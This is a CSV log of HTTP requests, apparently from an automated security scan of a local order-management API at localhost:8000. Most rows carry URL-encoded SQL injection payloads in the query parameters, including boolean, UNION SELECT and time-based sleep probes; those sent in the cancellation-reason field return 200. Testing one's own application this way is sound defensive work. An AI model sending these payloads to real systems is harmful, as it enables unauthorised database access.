ID,Requisição de Timestamp,Timestamp de Resposta,Método,URL,Código,Motivo,RTT,Tamanho do Cabeçalho da Resposta,Tamanho do Corpo da Resposta
247,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,200,OK,5,92,0
248,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,200,OK,6,92,0
249,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento+AND+1%3D1+--+,200,OK,6,92,0
250,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento+AND+1%3D2+--+,200,OK,6,92,0
251,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento+OR+1%3D1+--+,200,OK,6,92,0
252,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento+AND+1%3D2+--+,200,OK,6,92,0
253,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento+OR+1%3D1+--+,200,OK,6,92,0
254,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%27+AND+%271%27%3D%271%27+--+,200,OK,5,92,0
255,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%27+AND+%271%27%3D%272%27+--+,200,OK,6,92,0
256,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%27+OR+%271%27%3D%271%27+--+,200,OK,6,92,0
257,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%27+AND+%271%27%3D%272%27+--+,200,OK,7,92,0
258,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%27+OR+%271%27%3D%271%27+--+,200,OK,6,92,0
259,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento+UNION+ALL+select+NULL+--+,200,OK,6,92,0
260,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%27+UNION+ALL+select+NULL+--+,200,OK,7,92,0
261,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%22+UNION+ALL+select+NULL+--+,200,OK,6,92,0
262,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%29+UNION+ALL+select+NULL+--+,200,OK,7,92,0
263,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%27%29+UNION+ALL+select+NULL+--+,200,OK,6,92,0
264,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,200,OK,5,92,0
265,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,GET,http://localhost:8000,404,Not Found,1,99,0
266,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10+%2F+sleep%2815%29+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,3,158,264
267,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,GET,http://localhost:8000/api,404,Not Found,3,99,0
268,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10%27+%2F+sleep%2815%29+%2F+%27&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,268
269,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,GET,http://localhost:8000/api/Pedidos,404,Not Found,3,99,0
270,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10%22+%2F+sleep%2815%29+%2F+%22&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,3,158,270
271,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10+and+0+in+%28select+sleep%2815%29+%29+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,284
272,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10%27+and+0+in+%28select+sleep%2815%29+%29+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,285
273,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10%22+and+0+in+%28select+sleep%2815%29+%29+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,286
274,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10+where+0+in+%28select+sleep%2815%29+%29+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,286
275,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10%27+where+0+in+%28select+sleep%2815%29+%29+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,287
276,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10%22+where+0+in+%28select+sleep%2815%29+%29+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,288
277,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10+or+0+in+%28select+sleep%2815%29+%29+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,3,158,283
278,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento+%2F+sleep%2815%29+&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,275
279,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento%27+%2F+sleep%2815%29+%2F+%27&motivoCancelamento=motivoCancelamento,400,Bad Request,3,158,279
280,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento%22+%2F+sleep%2815%29+%2F+%22&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,281
281,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento+and+0+in+%28select+sleep%2815%29+%29+--+&motivoCancelamento=motivoCancelamento,400,Bad Request,3,158,295
282,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento%27+and+0+in+%28select+sleep%2815%29+%29+--+&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,296
283,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento%22+and+0+in+%28select+sleep%2815%29+%29+--+&motivoCancelamento=motivoCancelamento,400,Bad Request,4,158,297
284,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento+where+0+in+%28select+sleep%2815%29+%29+--+&motivoCancelamento=motivoCancelamento,400,Bad Request,3,158,297
285,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento%27+where+0+in+%28select+sleep%2815%29+%29+--+&motivoCancelamento=motivoCancelamento,400,Bad Request,4,158,298
286,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento%22+where+0+in+%28select+sleep%2815%29+%29+--+&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,299
287,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento+or+0+in+%28select+sleep%2815%29+%29+--+&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,294
288,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento+%2F+sleep%2815%29+,200,OK,9,92,0
289,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%27+%2F+sleep%2815%29+%2F+%27,200,OK,7,92,0
290,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%22+%2F+sleep%2815%29+%2F+%22,200,OK,6,92,0
291,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento+and+0+in+%28select+sleep%2815%29+%29+--+,200,OK,6,92,0
292,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%27+and+0+in+%28select+sleep%2815%29+%29+--+,200,OK,6,92,0
293,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%22+and+0+in+%28select+sleep%2815%29+%29+--+,200,OK,5,92,0
294,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento+where+0+in+%28select+sleep%2815%29+%29+--+,200,OK,5,92,0
295,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%27+where+0+in+%28select+sleep%2815%29+%29+--+,200,OK,6,92,0
296,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%22+where+0+in+%28select+sleep%2815%29+%29+--+,200,OK,6,92,0
297,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento+or+0+in+%28select+sleep%2815%29+%29+--+,200,OK,5,92,0
298,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,GET,http://localhost:8000,404,Not Found,2,99,0
299,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,GET,http://localhost:8000/api,404,Not Found,1,99,0
300,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,401
301,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,GET,http://localhost:8000/api/Pedidos,404,Not Found,1,99,0
302,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,3,158,402
303,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,1,158,403
304,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,402
305,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=%22java.lang.Thread.sleep%22%2815000%29&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,3,158,282
306,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10+%2F+%22java.lang.Thread.sleep%22%2815000%29+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,3,158,288
307,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,3,158,292
308,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,294
309,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,416
310,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento,400,Bad Request,3,158,417
311,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&motivoCancelamento=motivoCancelamento,400,Bad Request,3,158,395
312,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&motivoCancelamento=motivoCancelamento,400,Bad Request,3,158,396
313,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&motivoCancelamento=motivoCancelamento,400,Bad Request,3,158,397
314,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,396
315,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=%22java.lang.Thread.sleep%22%2815000%29&motivoCancelamento=motivoCancelamento,400,Bad Request,3,158,276
316,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento+%2F+%22java.lang.Thread.sleep%22%2815000%29+&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,299
317,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,303
318,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,305
319,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,427
320,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+&motivoCancelamento=motivoCancelamento,400,Bad Request,2,158,428
321,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,7,92,0
322,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=%27%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,6,92,0
323,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=%22%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,7,92,0
324,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=%29%3B+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27+--+,200,OK,5,92,0
325,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=%22java.lang.Thread.sleep%22%2815000%29,200,OK,6,92,0
326,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento+%2F+%22java.lang.Thread.sleep%22%2815000%29+,200,OK,5,92,0
327,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%27+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%27,200,OK,6,92,0
328,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%22+%2F+%22java.lang.Thread.sleep%22%2815000%29+%2F+%22,200,OK,6,92,0
329,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,200,OK,6,92,0
330,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,POST,http://localhost:8000/api/Pedidos/altera-status-pedido?numeroPedido=10&status=AguardandoPagamento&motivoCancelamento=motivoCancelamento%27+and+exists+%28+select+%22java.lang.Thread.sleep%22%2815000%29+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%3D+%27SYSTEM_COLUMNS%27+and+COLUMN_NAME+%3D+%27TABLE_NAME%27%29+--+,200,OK,7,92,0
331,Sun Jun 23 13:56:20 BRT 2024,Sun Jun 23 13:56:20 BRT 2024,GET,http://localhost:8000,404,Not Found,1,99,0
